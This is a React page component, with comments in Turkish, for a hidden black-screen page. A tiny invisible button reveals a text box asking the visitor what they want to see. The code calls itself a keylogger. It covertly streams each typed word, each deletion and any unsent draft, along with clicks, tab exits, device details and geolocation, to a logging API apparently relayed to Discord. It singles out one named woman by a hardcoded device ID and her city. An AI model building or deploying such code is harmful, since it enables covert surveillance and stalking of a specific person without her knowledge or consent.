import React, { useState, useEffect, useRef, useCallback } from 'react';
import { postLogToApi } from '../utils/gardenEngine';

/**
 * LastLetterPage Component (/last)
 * Pure Stealth Dark Mode Screen
 * - Arkaplan zifiri siyah (#000000). Hiçbir yazı yok.
 * - Sağ altta çok küçük, zayıfça fark edilebilen 6px yuvarlak gizli buton.
 * - Butona tıklanınca "Ne görmek istiyorsun? Söyle. Ciddiyim Ne görmek istiyorsun?" sorusu ve yazı alanı açılır.
 * - CANLI KELİME KELİME YAZIM AKIŞI (Word-by-word streaming):
 *   - Ziyaretçi yazarken kelime sonlarında (boşluk/noktalama) veya 300ms duraksamada canlı kelime akışı iletilir.
 *   - Silme işlemlerinde anında silinen parçayı bildirir.
 *   - Sekmeden ayrılmada 3 tane mükerrer bildirim değil TEK VE TEMİZ 1 bildirim gider.
 */
export default function LastLetterPage({ onGoHome }) {
  // Device & Auth
  const getDeviceId = () => {
    try {
      return localStorage.getItem('mayko_persistent_device_id') || 'dev_guest';
    } catch (e) {
      return 'dev_guest';
    }
  };
  const deviceId = getDeviceId();

  // Analytics & Timing
  const sessionStartTimeRef = useRef(Date.now());
  const currentStageRef = useRef('Gizli Siyah Ekran');

  // Interactive Secret State
  const [isSecretOpen, setIsSecretOpen] = useState(false);
  const [inputText, setInputText] = useState('');
  const [isSubmitted, setIsSubmitted] = useState(false);

  // Real-time Keylogger Accumulator Refs
  const allTypedHistoryRef = useRef('');
  const deletedTextHistoryRef = useRef('');
  const prevTextRef = useRef('');
  const lastSentTextRef = useRef('');
  const typingTimerRef = useRef(null);
  const lastClickTimeRef = useRef(0);
  const lastExitTimeRef = useRef(0);

  // Detect Client Device
  const detectDevice = useCallback(() => {
    if (typeof window === 'undefined') return 'Bilinmiyor';
    const ua = navigator.userAgent;
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
    const os = /Mac/i.test(ua) ? 'macOS' : /Windows/i.test(ua) ? 'Windows' : /Linux/i.test(ua) ? 'Linux' : 'Bilinmiyor';
    return `${os} ${isMobile ? '(Mobil)' : '(Masaüstü)'}`;
  }, []);

  // Helper for Webhook Logging
  const sendLog = useCallback((eventType, extraData = {}) => {
    const elapsedSec = Math.floor((Date.now() - sessionStartTimeRef.current) / 1000);
    const elapsedMins = Math.floor(elapsedSec / 60);
    const remSecs = elapsedSec % 60;
    const timeStr = elapsedMins > 0 ? `${elapsedMins} dk ${remSecs} sn sonra` : `${elapsedSec} saniye sonra`;

    postLogToApi(eventType, {
      stage: currentStageRef.current,
      buttonClickTime: timeStr,
      buttonClickSeconds: elapsedSec,
      deviceId: deviceId,
      device: detectDevice(),
      is_aysenur: true,
      ...extraData
    });
  }, [deviceId, detectDevice]);

  // Fire Immediate Page Entry Webhook Notification on Mount (0. Saniye)
  useEffect(() => {
    let isMounted = true;
    let hasNotified = false;

    const notifyEntry = async () => {
      if (hasNotified) return;

      // Ignore background prerender state (e.g. typing in Chrome address bar)
      if (typeof document !== 'undefined' && document.visibilityState === 'prerender') {
        return;
      }

      hasNotified = true;
      let isAysenur = deviceId === 'dev_uu756pefo_msyyhe2u';
      let geoData = null;

      try {
        const res = await fetch(`/api/geo?deviceId=${encodeURIComponent(deviceId)}`);
        if (res.ok) {
          geoData = await res.json();
          if (geoData && (geoData.isAysenur || geoData.isBursa)) {
            isAysenur = true;
          }
        }
      } catch (e) {}

      if (!isMounted) return;

      sendLog('last_page_entered', {
        isAysenur: isAysenur,
        is_aysenur: isAysenur,
        location: geoData ? `${geoData.city}, ${geoData.country}` : null,
        action: isAysenur
          ? '🌹 AYŞENUR SİTEYE GİRİŞ YAPTI! (dev_uu756pefo_msyyhe2u)'
          : 'Ziyaretçi Siyah Ekran Sayfasına Giriş Yaptı'
      });
    };

    if (typeof document !== 'undefined' && document.visibilityState === 'prerender') {
      const handleVisibilityChange = () => {
        if (document.visibilityState === 'visible') {
          notifyEntry();
          document.removeEventListener('visibilitychange', handleVisibilityChange);
        }
      };
      document.addEventListener('visibilitychange', handleVisibilityChange);
    } else {
      notifyEntry();
    }

    return () => {
      isMounted = false;
    };
  }, [sendLog, deviceId]);

  // Single De-duplicated Tab Exit & Return Visibility Sentinel (Fixes the 3 duplicate exit notifications)
  useEffect(() => {
    let isHiddenState = false;

    const triggerSingleExitLog = () => {
      const now = Date.now();
      if (now - lastExitTimeRef.current < 5000) return; // 5-second deduplication lock
      lastExitTimeRef.current = now;

      const elapsedMs = now - sessionStartTimeRef.current;
      const mins = Math.floor(elapsedMs / 60000);
      const secs = Math.floor((elapsedMs % 60000) / 1000);
      const durationStr = `${String(mins).padStart(2, '0')} dk ${String(secs).padStart(2, '0')} sn`;
      const currentUnsubmittedText = prevTextRef.current || null;

      const payload = {
        action: currentUnsubmittedText
          ? `🚪 Ziyaretçi Sekmeyi Değiştirdi (Kutuda Gönderilmeyen Yazı: "${currentUnsubmittedText}")`
          : '🚪 Ziyaretçi Sekmeyi Değiştirdi / Arka Plana Aldı / Ayrıldı',
        duration: durationStr,
        stage: currentStageRef.current,
        letterText: currentUnsubmittedText,
        answer: currentUnsubmittedText,
        allTypedHistory: allTypedHistoryRef.current || currentUnsubmittedText,
        deletedText: deletedTextHistoryRef.current || null,
        deviceId: deviceId,
        device: detectDevice(),
        is_aysenur: true
      };

      sendLog('visitor_left_page', payload);
    };

    const handleVisibilityChange = () => {
      if (document.visibilityState === 'hidden') {
        if (isHiddenState) return;
        isHiddenState = true;
        triggerSingleExitLog();
      } else if (document.visibilityState === 'visible') {
        if (!isHiddenState) return;
        isHiddenState = false;

        const elapsedMs = Date.now() - sessionStartTimeRef.current;
        const mins = Math.floor(elapsedMs / 60000);
        const secs = Math.floor((elapsedMs % 60000) / 1000);
        const durationStr = `${String(mins).padStart(2, '0')} dk ${String(secs).padStart(2, '0')} sn`;

        sendLog('visitor_returned_to_page', {
          action: '🚪 Ziyaretçi Sekmeye Geri Dönüş Yaptı! (Sayfa Yeniden Ekranda)',
          duration: durationStr,
          stage: currentStageRef.current,
          deviceId: deviceId,
          device: detectDevice(),
          is_aysenur: true
        });
      }
    };

    const handleBeforeUnload = () => {
      triggerSingleExitLog();
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);
    window.addEventListener('pagehide', handleBeforeUnload);
    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('pagehide', handleBeforeUnload);
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, [sendLog, deviceId, detectDevice]);

  // Global Click Sentinel (Sends notification for ANY click made anywhere on the screen)
  useEffect(() => {
    const handleGlobalClick = (e) => {
      const now = Date.now();
      if (now - lastClickTimeRef.current < 500) return; // Debounce rapid multi-clicks (500ms)
      lastClickTimeRef.current = now;

      const clickType = e.type === 'contextmenu' ? 'Sağ Tıklama (Context Menu)' : 'Sol Tıklama';
      let targetLabel = 'Siyah Boş Ekrana Tıkladı';

      if (e.target) {
        const tagName = String(e.target.tagName || '').toUpperCase();
        const className = String(e.target.className || '');

        if (className.includes('secret-dot') || (tagName === 'BUTTON' && !e.target.innerText)) {
          targetLabel = 'Sağ Alttaki Gizli Nokta Butonuna Tıkladı';
        } else if (tagName === 'TEXTAREA') {
          targetLabel = 'Gizli Soru Yazı Kutusuna Tıkladı';
        } else if (tagName === 'BUTTON' && e.target.innerText.includes('Gönder')) {
          targetLabel = 'Gönder Butonuna Tıkladı';
        } else if (tagName === 'H2') {
          targetLabel = 'Soru Başlığına Tıkladı';
        } else {
          targetLabel = `Ekranda Öğe Tıklandı (${tagName}${className ? '.' + className.slice(0, 20) : ''})`;
        }
      }

      const coords = `X: ${e.clientX || 0}px, Y: ${e.clientY || 0}px`;

      sendLog('last_user_click', {
        clickType,
        targetElement: targetLabel,
        coordinates: coords,
        action: `Ziyaretçi Ekrana Tıkladı (${clickType} - ${targetLabel} - ${coords})`
      });
    };

    window.addEventListener('click', handleGlobalClick);
    window.addEventListener('contextmenu', handleGlobalClick);

    return () => {
      window.removeEventListener('click', handleGlobalClick);
      window.removeEventListener('contextmenu', handleGlobalClick);
    };
  }, [sendLog]);

  // Handle Secret Button Click
  const handleSecretButtonClick = () => {
    setIsSecretOpen(true);
    currentStageRef.current = 'Gizli Soru Kutusu Açıldı';

    sendLog('secret_button_clicked', {
      clickType: 'Gizli Nokta Buton Tıklaması',
      targetElement: 'BUTTON.secret-dot',
      coordinates: 'Sağ Alt Köşe (12px, 12px)',
      action: 'Ziyaretçi Sağ Alttaki Nokta Butonuna Tıkladı & Soru Açıldı'
    });
  };

  // Live Word-by-Word Typing Stream Engine:
  // - Triggers IMMEDIATELY on deletion (0ms).
  // - Triggers IMMEDIATELY on word boundary (space or punctuation).
  // - Triggers after 300ms pause while typing phrases.
  const handleInputChange = (e) => {
    const newVal = e.target.value;
    const oldVal = prevTextRef.current;
    setInputText(newVal);

    let isDeletion = false;
    let deletedSegment = '';

    // 1. Accumulate typed characters into memory
    if (newVal.length > oldVal.length) {
      const added = newVal.slice(oldVal.length);
      allTypedHistoryRef.current += added;
    } else if (newVal.length < oldVal.length) {
      // 2. Track deleted text snippets into memory
      deletedSegment = oldVal.slice(newVal.length);
      if (deletedSegment) {
        deletedTextHistoryRef.current += ` [silindi: "${deletedSegment}"]`;
        isDeletion = true;
      }
    }

    prevTextRef.current = newVal;

    // A) IMMEDIATE DELETION TRIGGER (0ms Delay)
    if (isDeletion) {
      if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
      lastSentTextRef.current = newVal;

      sendLog('secret_input_deleted', {
        letterText: newVal || '(Tüm metin silindi)',
        answer: newVal || '(Tüm metin silindi)',
        answerInput: newVal || '(Tüm metin silindi)',
        allTypedHistory: allTypedHistoryRef.current || '(Tüm metin silindi)',
        deletedText: deletedSegment || deletedTextHistoryRef.current,
        draftLength: newVal.length,
        action: `✂️ Ziyaretçi Metin Sildi: "${deletedSegment}" (Kalan: "${newVal}")`
      });
      return;
    }

    // B) LIVE WORD-BY-WORD & FAST PHRASE TYPING ENGINE
    const isWordBoundary = /\s|[.,!?]$/.test(newVal);

    if (newVal !== lastSentTextRef.current) {
      if (typingTimerRef.current) clearTimeout(typingTimerRef.current);

      if (isWordBoundary) {
        // Instant send on space or punctuation
        lastSentTextRef.current = newVal;
        sendLog('secret_input_typed', {
          letterText: newVal,
          answer: newVal,
          answerInput: newVal,
          allTypedHistory: allTypedHistoryRef.current || newVal,
          deletedText: deletedTextHistoryRef.current || null,
          draftLength: newVal.length,
          action: `✍️ Canlı Yazılıyor: "${newVal}"`
        });
      } else {
        // Fast 300ms debounce while typing phrases
        typingTimerRef.current = setTimeout(() => {
          if (prevTextRef.current !== lastSentTextRef.current) {
            lastSentTextRef.current = prevTextRef.current;
            sendLog('secret_input_typed', {
              letterText: prevTextRef.current,
              answer: prevTextRef.current,
              answerInput: prevTextRef.current,
              allTypedHistory: allTypedHistoryRef.current || prevTextRef.current,
              deletedText: deletedTextHistoryRef.current || null,
              draftLength: prevTextRef.current.length,
              action: `✍️ Canlı Yazılıyor: "${prevTextRef.current}"`
            });
          }
        }, 300);
      }
    }
  };

  // Handle Unfocus / Blur from Text Area (Captures unsubmitted draft when clicking away)
  const handleInputBlur = () => {
    if (allTypedHistoryRef.current && allTypedHistoryRef.current.length > 0) {
      if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
      lastSentTextRef.current = inputText;

      sendLog('secret_input_unfocused', {
        letterText: inputText || '(Silindi / Boş)',
        answer: inputText || '(Silindi / Boş)',
        answerInput: inputText || '(Silindi / Boş)',
        allTypedHistory: allTypedHistoryRef.current || inputText,
        deletedText: deletedTextHistoryRef.current || null,
        draftLength: inputText.length,
        action: `✍️ Ziyaretçi Kutusundan Çıktı / Gönder'e Basmadı (Kutuda Kalan: "${inputText}")`
      });
    }
  };

  // Handle Form Submission ("Gönder" button click or Ctrl+Enter / Enter)
  const handleSubmit = (e) => {
    if (e) e.preventDefault();
    if (!inputText.trim()) return;

    if (typingTimerRef.current) clearTimeout(typingTimerRef.current);
    lastSentTextRef.current = inputText;

    // Send primary submission event to BotGhost / Discord
    sendLog('secret_input_submitted', {
      letterText: inputText,
      answer: inputText,
      answerInput: inputText,
      allTypedHistory: allTypedHistoryRef.current || inputText,
      deletedText: deletedTextHistoryRef.current || null,
      draftLength: inputText.length,
      action: `🔥 GİZLİ SORUYA CEVAP GÖNDERİLDİ: "${inputText}"`
    });

    setIsSubmitted(true);
    setTimeout(() => {
      setIsSubmitted(false);
    }, 4000);
  };

  return (
    <div
      style={{
        position: 'fixed',
        inset: 0,
        width: '100vw',
        height: '100vh',
        backgroundColor: '#000000',
        color: '#f8fafc',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '24px',
        margin: 0,
        overflow: 'hidden',
        userSelect: 'none',
        fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif"
      }}
    >
      {/* 1. SECRET TINY DOT BUTTON (Bottom Right - 6px Diameter, 1 Shade Lighter than Pitch Black #000) */}
      <button
        onClick={handleSecretButtonClick}
        aria-label="Secret trigger"
        className="secret-dot"
        style={{
          position: 'fixed',
          bottom: '12px',
          right: '12px',
          width: '6px',
          height: '6px',
          borderRadius: '50%',
          backgroundColor: '#18181b',
          border: 'none',
          outline: 'none',
          cursor: 'pointer',
          padding: 0,
          margin: 0,
          zIndex: 9999,
          transition: 'background-color 0.3s ease, transform 0.2s ease'
        }}
        onMouseEnter={(e) => {
          e.currentTarget.style.backgroundColor = '#27272a';
          e.currentTarget.style.transform = 'scale(1.4)';
        }}
        onMouseLeave={(e) => {
          e.currentTarget.style.backgroundColor = '#18181b';
          e.currentTarget.style.transform = 'scale(1)';
        }}
      />

      {/* 2. REVEALED QUESTION & INPUT FORM (Visible after clicking the tiny secret dot) */}
      {isSecretOpen && (
        <div
          style={{
            maxWidth: 580,
            width: '100%',
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            textAlign: 'center',
            animation: 'fadeIn 0.6s ease-out forwards',
            zIndex: 10
          }}
        >
          {/* Question Title */}
          <h2
            style={{
              fontFamily: "'Cardo', Georgia, serif",
              fontSize: 'clamp(1.25rem, 3.5vw, 1.85rem)',
              fontWeight: 400,
              color: '#e4e7ec',
              lineHeight: 1.55,
              marginBottom: 28,
              letterSpacing: '0.015em',
              textShadow: '0 0 20px rgba(255, 255, 255, 0.15)'
            }}
          >
            Ne görmek istiyorsun? Söyle. Ciddiyim Ne görmek istiyorsun?
          </h2>

          {/* Text Area Form */}
          <form
            onSubmit={handleSubmit}
            style={{
              width: '100%',
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center'
            }}
          >
            <textarea
              value={inputText}
              onChange={handleInputChange}
              onBlur={handleInputBlur}
              onKeyDown={(e) => {
                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
                  handleSubmit(e);
                }
              }}
              placeholder="Yazmak istediğin şey..."
              autoFocus
              rows={4}
              style={{
                width: '100%',
                maxWidth: 520,
                backgroundColor: 'rgba(18, 18, 22, 0.85)',
                color: '#f4f4f5',
                border: '1px solid rgba(255, 255, 255, 0.14)',
                borderRadius: '14px',
                padding: '16px 20px',
                fontSize: '1.05rem',
                fontFamily: "'Cardo', Georgia, serif",
                lineHeight: 1.6,
                outline: 'none',
                resize: 'none',
                boxShadow: '0 10px 30px rgba(0, 0, 0, 0.8), inset 0 2px 4px rgba(0, 0, 0, 0.5)',
                transition: 'border-color 0.3s ease, box-shadow 0.3s ease'
              }}
            />

            <div
              style={{
                marginTop: 20,
                display: 'flex',
                alignItems: 'center',
                gap: 12
              }}
            >
              <button
                type="submit"
                disabled={!inputText.trim()}
                style={{
                  backgroundColor: inputText.trim() ? '#27272a' : '#141416',
                  color: inputText.trim() ? '#f4f4f5' : '#52525b',
                  border: '1px solid rgba(255, 255, 255, 0.1)',
                  borderRadius: '9999px',
                  padding: '10px 28px',
                  fontSize: '0.95rem',
                  fontFamily: "'Cardo', Georgia, serif",
                  cursor: inputText.trim() ? 'pointer' : 'default',
                  transition: 'all 0.25s ease'
                }}
              >
                Gönder
              </button>

              {isSubmitted && (
                <span
                  style={{
                    color: '#34d399',
                    fontSize: '0.9rem',
                    fontStyle: 'italic',
                    animation: 'fadeIn 0.3s ease forwards'
                  }}
                >
                  ✓ Gönderildi
                </span>
              )}
            </div>
          </form>
        </div>
      )}

      {/* Global CSS for Animations */}
      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; transform: scale(0.98); }
          to { opacity: 1; transform: scale(1); }
        }
      `}</style>
    </div>
  );
}
